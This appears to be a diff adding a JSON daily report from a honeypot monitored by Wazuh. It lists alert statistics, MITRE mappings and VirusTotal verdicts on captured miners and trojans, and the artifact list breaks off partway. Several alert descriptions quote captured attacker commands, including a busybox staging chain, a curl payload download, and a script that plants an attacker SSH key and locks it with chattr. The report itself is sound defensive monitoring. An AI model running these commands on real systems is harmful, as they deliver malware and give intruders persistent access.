@@ -1,0 +1,1336 @@
+{
+  "wazuh": {
+    "source": "wazuh",
+    "summary": {
+      "severity": {
+        "low": 86000,
+        "high": 236,
+        "medium": 1071,
+        "critical": 18,
+        "informational": 0
+      },
+      "total_alerts": 87325,
+      "geolocated_alerts": 5415,
+      "attack_related_alerts": 20024,
+      "honeypot_interactions": 81768,
+      "authentication_failures": 1785,
+      "authentication_successes": 490,
+      "country_coverage_percent": 6.2
+    },
+    "top_rules": [
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 39153
+          }
+        ],
+        "rule_id": "110213",
+        "alert_count": 39153,
+        "description": "T-Pot RDP connection from [IP address] to port 3389.",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 16533
+          }
+        ],
+        "rule_id": "110205",
+        "alert_count": 16533,
+        "description": "T-Pot Honeytrap received a payload from [IP address]",
+        "highest_level": 6
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 10281
+          }
+        ],
+        "rule_id": "110207",
+        "alert_count": 10281,
+        "description": "T-Pot SentryPeer SIP activity from [IP address]:63356, method INVITE",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 7820
+          }
+        ],
+        "rule_id": "110204",
+        "alert_count": 7820,
+        "description": "T-Pot Honeytrap connection from [IP address] to port 2222",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 5333
+          }
+        ],
+        "rule_id": "110219",
+        "alert_count": 5333,
+        "description": "T-Pot CiscoASA web activity from [IP address]: Request timed out: TimeoutError('The read operation timed out')",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2203
+          }
+        ],
+        "rule_id": "110101",
+        "alert_count": 2203,
+        "description": "Cowrie SSH connection from [IP address].",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1785
+          }
+        ],
+        "rule_id": "110102",
+        "alert_count": 1785,
+        "description": "Cowrie failed login from [IP address] using username casia.",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 756
+          }
+        ],
+        "rule_id": "110201",
+        "alert_count": 756,
+        "description": "T-Pot Dionaea pptpd connection from [IP address] to port 1723",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 717
+          }
+        ],
+        "rule_id": "110223",
+        "alert_count": 717,
+        "description": "T-Pot HoneyAML received GET request from [IP address] to /fetch on port 3000.",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 380
+          }
+        ],
+        "rule_id": "110216",
+        "alert_count": 380,
+        "description": "T-Pot Mailoney received SMTP command from [IP address]: EHLO User\r",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 206
+          },
+          {
+            "name": "wazuh",
+            "alerts": 82
+          }
+        ],
+        "rule_id": "5501",
+        "alert_count": 288,
+        "description": "PAM: Login session opened.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 286
+          }
+        ],
+        "rule_id": "110104",
+        "alert_count": 286,
+        "description": "Cowrie captured a command from [IP address]: config terminal",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 189
+          },
+          {
+            "name": "wazuh",
+            "alerts": 77
+          }
+        ],
+        "rule_id": "5502",
+        "alert_count": 266,
+        "description": "PAM: Login session closed.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 240
+          },
+          {
+            "name": "wazuh",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "533",
+        "alert_count": 241,
+        "description": "Listened ports status (netstat) changed (new port opened or closed).",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 173
+          }
+        ],
+        "rule_id": "110217",
+        "alert_count": 173,
+        "description": "T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN\r",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 147
+          }
+        ],
+        "rule_id": "110209",
+        "alert_count": 147,
+        "description": "T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 126
+          }
+        ],
+        "rule_id": "110215",
+        "alert_count": 126,
+        "description": "T-Pot MiniPrint event: command_received, action request, Request received",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 126
+          }
+        ],
+        "rule_id": "110221",
+        "alert_count": 126,
+        "description": "T-Pot CiscoASA detected configuration discovery from [IP address]: \"GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1\" 404 -",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 110
+          },
+          {
+            "name": "wazuh",
+            "alerts": 7
+          }
+        ],
+        "rule_id": "5715",
+        "alert_count": 117,
+        "description": "sshd: authentication success.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 85
+          }
+        ],
+        "rule_id": "110103",
+        "alert_count": 85,
+        "description": "Cowrie accepted login from [IP address] using username root.",
+        "highest_level": 10
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 74
+          }
+        ],
+        "rule_id": "110220",
+        "alert_count": 74,
+        "description": "T-Pot CiscoASA captured a login request from [IP address]: \"POST /login.cgi HTTP/1.1\" 200 -",
+        "highest_level": 8
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 69
+          }
+        ],
+        "rule_id": "5402",
+        "alert_count": 69,
+        "description": "Successful sudo to ROOT executed.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 57
+          }
+        ],
+        "rule_id": "110212",
+        "alert_count": 57,
+        "description": "T-Pot Honeytrap detected repeated payload activity from [IP address].",
+        "highest_level": 10
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 50
+          }
+        ],
+        "rule_id": "110106",
+        "alert_count": 50,
+        "description": "Cowrie detected repeated failed logins from [IP address].",
+        "highest_level": 10
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 40
+          },
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "510",
+        "alert_count": 41,
+        "description": "Host-based anomaly detection event (rootcheck).",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 37
+          }
+        ],
+        "rule_id": "110214",
+        "alert_count": 37,
+        "description": "T-Pot RDP honeypot detected a connection burst from [IP address].",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 32
+          }
+        ],
+        "rule_id": "110108",
+        "alert_count": 32,
+        "description": "Cowrie captured suspicious execution or staging activity from [IP address]: >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\\x43\\x4c\\x53\\x49\\x4f\\x4c'",
+        "highest_level": 12
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 18
+          }
+        ],
+        "rule_id": "110208",
+        "alert_count": 18,
+        "description": "T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5093",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 14
+          }
+        ],
+        "rule_id": "110225",
+        "alert_count": 14,
+        "description": "T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address].",
+        "highest_level": 13
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 12
+          }
+        ],
+        "rule_id": "110224",
+        "alert_count": 12,
+        "description": "T-Pot HoneyAML received an HTTP POST from [IP address] to /fetch.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 11
+          }
+        ],
+        "rule_id": "110107",
+        "alert_count": 11,
+        "description": "Cowrie captured a probable payload-retrieval command from [IP address]: curl -O http://[IP address]/ok",
+        "highest_level": 12
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 11
+          }
+        ],
+        "rule_id": "592",
+        "alert_count": 11,
+        "description": "Log file size reduced.",
+        "highest_level": 8
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 10
+          }
+        ],
+        "rule_id": "550",
+        "alert_count": 10,
+        "description": "Integrity checksum changed.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 9
+          }
+        ],
+        "rule_id": "203",
+        "alert_count": 9,
+        "description": "Agent event queue is full. Events may be lost.",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 8
+          }
+        ],
+        "rule_id": "202",
+        "alert_count": 8,
+        "description": "Agent event queue is 90% full.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 8
+          }
+        ],
+        "rule_id": "205",
+        "alert_count": 8,
+        "description": "Agent event queue is back to normal load.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 7
+          }
+        ],
+        "rule_id": "110211",
+        "alert_count": 7,
+        "description": "T-Pot Dionaea detected a connection burst from [IP address].",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 6
+          }
+        ],
+        "rule_id": "554",
+        "alert_count": 6,
+        "description": "File added to the system.",
+        "highest_level": 5
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 5
+          }
+        ],
+        "rule_id": "2902",
+        "alert_count": 5,
+        "description": "New dpkg (Debian Package) installed.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 5
+          }
+        ],
+        "rule_id": "2904",
+        "alert_count": 5,
+        "description": "Dpkg (Debian Package) half configured.",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 4
+          }
+        ],
+        "rule_id": "110109",
+        "alert_count": 4,
+        "description": "Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+        "highest_level": 13
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 3
+          }
+        ],
+        "rule_id": "2901",
+        "alert_count": 3,
+        "description": "New dpkg (Debian Package) requested to install.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 3
+          }
+        ],
+        "rule_id": "86003",
+        "alert_count": 3,
+        "description": "Docker: Error message",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2
+          }
+        ],
+        "rule_id": "11",
+        "alert_count": 2,
+        "description": "Unknown",
+        "highest_level": 4
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2
+          }
+        ],
+        "rule_id": "110222",
+        "alert_count": 2,
+        "description": "T-Pot CiscoASA detected repeated web requests from one source.",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 2
+          }
+        ],
+        "rule_id": "19004",
+        "alert_count": 2,
+        "description": "SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47)",
+        "highest_level": 7
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "110218",
+        "alert_count": 1,
+        "description": "T-Pot Mailoney detected repeated SMTP activity from one source.",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "110226",
+        "alert_count": 1,
+        "description": "T-Pot HoneyAML detected repeated web requests from one source.",
+        "highest_level": 10
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "19010",
+        "alert_count": 1,
+        "description": "CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "19011",
+        "alert_count": 1,
+        "description": "CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed",
+        "highest_level": 9
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "503",
+        "alert_count": 1,
+        "description": "Wazuh agent started.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "506",
+        "alert_count": 1,
+        "description": "Wazuh agent stopped.",
+        "highest_level": 3
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "5901",
+        "alert_count": 1,
+        "description": "New group added to the system.",
+        "highest_level": 8
+      },
+      {
+        "agents": [
+          {
+            "name": "wazuh",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "5902",
+        "alert_count": 1,
+        "description": "New user added to the system.",
+        "highest_level": 8
+      },
+      {
+        "agents": [
+          {
+            "name": "tpot",
+            "alerts": 1
+          }
+        ],
+        "rule_id": "591",
+        "alert_count": 1,
+        "description": "Log file rotated.",
+        "highest_level": 3
+      }
+    ],
+    "window_end": "2026-09-09T12:55:21Z",
+    "report_date": "2026-09-09",
+    "generated_at": "2026-09-09T12:55:21Z",
+    "window_start": "2026-09-08T12:55:21Z",
+    "mitre_tactics": [
+      {
+        "alerts": 475,
+        "tactic": "Defense Evasion"
+      },
+      {
+        "alerts": 474,
+        "tactic": "Privilege Escalation"
+      },
+      {
+        "alerts": 419,
+        "tactic": "Initial Access"
+      },
+      {
+        "alerts": 406,
+        "tactic": "Persistence"
+      },
+      {
+        "alerts": 117,
+        "tactic": "Lateral Movement"
+      },
+      {
+        "alerts": 50,
+        "tactic": "Credential Access"
+      },
+      {
+        "alerts": 46,
+        "tactic": "Execution"
+      },
+      {
+        "alerts": 25,
+        "tactic": "Command and Control"
+      },
+      {
+        "alerts": 21,
+        "tactic": "Impact"
+      }
+    ],
+    "top_countries": [
+      {
+        "alerts": 81910,
+        "country": "Unknown"
+      },
+      {
+        "alerts": 2577,
+        "country": "New Zealand"
+      },
+      {
+        "alerts": 2575,
+        "country": "United States"
+      },
+      {
+        "alerts": 200,
+        "country": "United Kingdom"
+      },
+      {
+        "alerts": 20,
+        "country": "Turkey"
+      },
+      {
+        "alerts": 13,
+        "country": "China"
+      },
+      {
+        "alerts": 6,
+        "country": "Canada"
+      },
+      {
+        "alerts": 6,
+        "country": "Germany"
+      },
+      {
+        "alerts": 6,
+        "country": "Romania"
+      },
+      {
+        "alerts": 5,
+        "country": "Australia"
+      },
+      {
+        "alerts": 2,
+        "country": "Iran"
+      },
+      {
+        "alerts": 2,
+        "country": "Russia"
+      },
+      {
+        "alerts": 1,
+        "country": "Bulgaria"
+      },
+      {
+        "alerts": 1,
+        "country": "Switzerland"
+      },
+      {
+        "alerts": 1,
+        "country": "Ukraine"
+      }
+    ],
+    "mitre_techniques": [
+      {
+        "alerts": 405,
+        "technique": "Valid Accounts"
+      },
+      {
+        "alerts": 117,
+        "technique": "Remote Services"
+      },
+      {
+        "alerts": 69,
+        "technique": "Sudo and Sudo Caching"
+      },
+      {
+        "alerts": 50,
+        "technique": "Brute Force"
+      },
+      {
+        "alerts": 46,
+        "technique": "Command and Scripting Interpreter"
+      },
+      {
+        "alerts": 25,
+        "technique": "Ingress Tool Transfer"
+      },
+      {
+        "alerts": 21,
+        "technique": "Stored Data Manipulation"
+      },
+      {
+        "alerts": 14,
+        "technique": "Exploit Public-Facing Application"
+      },
+      {
+        "alerts": 1,
+        "technique": "Create Account"
+      },
+      {
+        "alerts": 1,
+        "technique": "Disable or Modify Tools"
+      }
+    ],
+    "attack_categories": {
+      "malware": 57,
+      "web_attack": 729,
+      "smtp_attack": 173,
+      "network_scan": 44,
+      "network_attack": 16590,
+      "reconnaissance": 364,
+      "payload_delivery": 16590,
+      "command_execution": 333,
+      "authentication_failure": 1785
+    },
+    "export_schema_version": 1
+  },
+  "summary": {
+    "known_count": 19,
+    "artifact_count": 19,
+    "uploaded_count": 0,
+    "malicious_count": 19,
+    "suspicious_count": 0,
+    "lookup_error_count": 0
+  },
+  "artifacts": [
+    {
+      "md5": "0fa41de75420479c9120641df3b4f317",
+      "sha1": "cbe89930c606fafad01189ce3dacc5228115bd4a",
+      "sha256": "94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T18:01:46.118796+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-07T15:47:22.737441+00:00",
+      "size_bytes": 30304472,
+      "artifact_id": "10a066a3-d18e-41d5-8344-b7dd64c30d3d",
+      "vt_harmless": 0,
+      "vt_file_type": "ELF",
+      "vt_malicious": 46,
+      "vt_reputation": -85,
+      "vt_suspicious": 0,
+      "vt_undetected": 17,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.866+00:00",
+      "vt_threat_label": "miner.multiverze/genericrxss",
+      "vt_meaningful_name": "20260903-015900_sftp__root__8074228092978951422_sshd",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "8844985fcd57b0311d1d4cb2ec13a1ef",
+      "sha1": "a0c07fe897515e5575a72f94f9dea8c077a410ff",
+      "sha256": "0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-09T06:48:42.425087+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-07T04:33:38.051742+00:00",
+      "size_bytes": 46525,
+      "artifact_id": "09f6f517-c36b-4706-9e0e-3899732d850b",
+      "vt_harmless": 0,
+      "vt_file_type": "Android",
+      "vt_malicious": 45,
+      "vt_reputation": -43,
+      "vt_suspicious": 0,
+      "vt_undetected": 19,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.867+00:00",
+      "vt_threat_label": "trojan.adbminer/andr",
+      "vt_meaningful_name": "0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "be4d7087f6e0de471f2d4760a6e79859",
+      "sha1": "d59c4698d6102bfdeb6d381f415427759769aabb",
+      "sha256": "76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-09T06:49:05.24216+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-07T04:34:17.764668+00:00",
+      "size_bytes": 239388,
+      "artifact_id": "db66ec7a-2100-46b4-a9ff-31a029b0d509",
+      "vt_harmless": 0,
+      "vt_file_type": "ELF",
+      "vt_malicious": 39,
+      "vt_reputation": -5,
+      "vt_suspicious": 0,
+      "vt_undetected": 22,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.867+00:00",
+      "vt_threat_label": "miner.adbminer/mirai",
+      "vt_meaningful_name": "76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64.raw",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "9a5ed9fc7ec798ece13b8e5565a35e61",
+      "sha1": "0f1a2f175621dee6e8428f527223efe5984d5dda",
+      "sha256": "d166541ec5b322c7bafea156ef89a99f7255c78da2c2fc5e6ef0546892e692b1",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T18:11:24.870471+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T18:11:24.870471+00:00",
+      "size_bytes": 28147712,
+      "artifact_id": "ae5351ef-6eab-4598-b19e-02dda245a818",
+      "vt_harmless": 0,
+      "vt_file_type": "ELF",
+      "vt_malicious": 38,
+      "vt_reputation": 0,
+      "vt_suspicious": 0,
+      "vt_undetected": 24,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.866+00:00",
+      "vt_threat_label": "miner.multiverze/r002c0df726",
+      "vt_meaningful_name": "d166541ec5b322c7bafea156ef89a99f7255c78da2c2fc5e6ef0546892e692b1.elf",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "9a10ba1d64a02ee308cd6479959d2db2",
+      "sha1": "6cf69206a7f60e9f32ec1237cd91965c905c0557",
+      "sha256": "d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T19:51:31.688159+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-07T04:35:08.055086+00:00",
+      "size_bytes": 153208,
+      "artifact_id": "c48c7464-71d9-4dbe-977b-84aa9c4d0c67",
+      "vt_harmless": 0,
+      "vt_file_type": "ELF",
+      "vt_malicious": 36,
+      "vt_reputation": -44,
+      "vt_suspicious": 0,
+      "vt_undetected": 22,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.867+00:00",
+      "vt_threat_label": "miner.coinmine/bitcoinm",
+      "vt_meaningful_name": "d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0.raw",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "8e7e88377aae5459d5acaceae91a80ee",
+      "sha1": "c51d1e88476f88e2e0256e272913f419f4694134",
+      "sha256": "8e1a67a5c03b3cd818f046c7a1605afccc0ee5ce437a0d099881f1872b54bc70",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T13:39:25.810032+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T13:39:25.810032+00:00",
+      "size_bytes": 1838060,
+      "artifact_id": "066e458f-f24c-4ec8-b5bd-a20eb60def07",
+      "vt_harmless": 0,
+      "vt_file_type": "ELF",
+      "vt_malicious": 35,
+      "vt_reputation": -14,
+      "vt_suspicious": 0,
+      "vt_undetected": 28,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.866+00:00",
+      "vt_threat_label": "trojan.malxmr/usblgv26",
+      "vt_meaningful_name": "20260905-055943_sftp__root_redtail_i686",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "1ed17cd8d521a329e62321797547a03c",
+      "sha1": "379d971c686dfd0d10ed8c1b6bd5fe1ae3dd4f7e",
+      "sha256": "d70f917e35813a7ae323e6b2b539d6dbbfc3a3a6599f1fed93430b14ca08b141",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T13:39:05.356092+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T13:39:05.356092+00:00",
+      "size_bytes": 1448252,
+      "artifact_id": "5d2f767f-b0fa-4763-82f3-db5b0a6c2eb5",
+      "vt_harmless": 0,
+      "vt_file_type": "ELF",
+      "vt_malicious": 35,
+      "vt_reputation": -14,
+      "vt_suspicious": 0,
+      "vt_undetected": 28,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.866+00:00",
+      "vt_threat_label": "miner.r002c0xh226/abminer",
+      "vt_meaningful_name": "arm7",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "470523fe14e1951aca6d080a2af5eaf7",
+      "sha1": "a2426ab9df93640e06b382bf30b2bf623dfdcf1b",
+      "sha256": "7a656791b445fff02ac6e9dd1081cc265db935476a9ee71139cb6aef52102e2b",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T19:51:17.837482+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T19:51:17.837482+00:00",
+      "size_bytes": 231196,
+      "artifact_id": "a4d36332-eb78-4730-ab43-92fbf08b71b6",
+      "vt_harmless": 0,
+      "vt_file_type": "ELF",
+      "vt_malicious": 34,
+      "vt_reputation": -1,
+      "vt_suspicious": 0,
+      "vt_undetected": 28,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.867+00:00",
+      "vt_threat_label": "trojan.adbminer/berbew",
+      "vt_meaningful_name": "7a656791b445fff02ac6e9dd1081cc265db935476a9ee71139cb6aef52102e2b.raw",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "117dd0c3e5b37e2db85305cc57d34730",
+      "sha1": "aa389c5fabc812bea68056224e3c58c6c5e43775",
+      "sha256": "3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T13:39:35.949498+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T13:39:35.949498+00:00",
+      "size_bytes": 1759768,
+      "artifact_id": "28fe7bb0-269b-419e-913d-dc9459339fc6",
+      "vt_harmless": 0,
+      "vt_file_type": "ELF",
+      "vt_malicious": 34,
+      "vt_reputation": -3,
+      "vt_suspicious": 0,
+      "vt_undetected": 28,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.866+00:00",
+      "vt_threat_label": "trojan.multiverze/usblh426",
+      "vt_meaningful_name": "20260830-100957_sftp__root_redtail_riscv",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "1f47ecc10bc008ad26e504897b940f22",
+      "sha1": "94e6098bab3b1d1d2930ab87e0f82f5fe3ac1d7b",
+      "sha256": "f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T13:39:47.365022+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T13:39:47.365022+00:00",
+      "size_bytes": 1989056,
+      "artifact_id": "1f1f6cde-587c-41ff-be73-def9e6bd9952",
+      "vt_harmless": 0,
+      "vt_file_type": "ELF",
+      "vt_malicious": 33,
+      "vt_reputation": -14,
+      "vt_suspicious": 0,
+      "vt_undetected": 30,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.866+00:00",
+      "vt_threat_label": "trojan.malxmr/usblgv26",
+      "vt_meaningful_name": "x86_64",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "0e0328dc8084e6203c09a3e5ea1539f8",
+      "sha1": "99be01382e567d68cb9f317fb3c039c17e4315eb",
+      "sha256": "d1cac82f44b54b0fd244a9e4122811e9ae108a197c7a65a20fd2e7552683e68e",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-08T13:39:15.118541+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-08T13:39:15.118541+00:00",
+      "size_bytes": 1696412,
+      "artifact_id": "38a73486-1dcf-4246-8ca3-fc9a116e6f2a",
+      "vt_harmless": 0,
+      "vt_file_type": "ELF",
+      "vt_malicious": 32,
+      "vt_reputation": -3,
+      "vt_suspicious": 0,
+      "vt_undetected": 30,
+      "capture_status": "known",
+      "vt_completed_at": "2026-09-09T13:05:35.866+00:00",
+      "vt_threat_label": "miner.malxmr/usblgv26",
+      "vt_meaningful_name": "aarch64",
+      "vt_response_status": 200
+    },
+    {
+      "md5": "74656c78bf501feeee3e28ce26eaf2b7",
+      "sha1": "f9be5de81df5f9556ad15e76ccbf7c652d3ac2d9",
+      "sha256": "2779ac942a1c5d8f07f6eec7d4707d1bf2583760029573da7fd23210084fa405",
+      "vt_error": null,
+      "vt_found": true,
+      "file_type": null,
+      "last_seen": "2026-09-09T04:10:22.287821+00:00",
+      "mime_type": null,
+      "first_seen": "2026-09-09T04:10:22.287821+00:00",
+      "size_bytes": 1399,
+      "artifact_id": "2f4c0274-a9c7-4adc-a488-99905cde99fa",
+      "vt_harmless": 0,
+      "vt_file_type": "Shell script",
+      "vt_malicious": 31,
+      "vt_reputation": 0,
+      "vt_suspicious": 0,
+      "vt_undetected": 30,
+      "capture_status": "known",
